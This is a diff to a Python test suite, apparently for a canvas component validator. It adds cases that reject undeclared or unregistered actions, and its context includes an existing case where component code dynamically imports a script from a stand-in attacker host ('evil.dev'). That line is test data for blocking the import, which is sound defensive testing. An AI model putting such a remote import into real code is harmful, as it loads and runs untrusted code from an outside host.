@@ -84,6 +84,16 @@ class TestCanvasSourceAdapter(SimpleTestCase):
                 "capability_missing_state",
             ),
             (
+                "undeclared_action_invoke",
+                project(files={CANVAS_COMPONENT_PATH: CODE + 'ph.actions.invoke("tasks.create", {});'}),
+                "capability_missing_action",
+            ),
+            (
+                "unregistered_declared_action",
+                project(capabilities={"posthog": {"actions": ["flags.delete"]}, "network": {"origins": []}}),
+                "action_not_registered",
+            ),
+            (
                 "dynamic_import",
                 project(files={CANVAS_COMPONENT_PATH: 'const m = await import("https://evil.dev/x.js");'}),
                 "forbidden_dynamic_import",
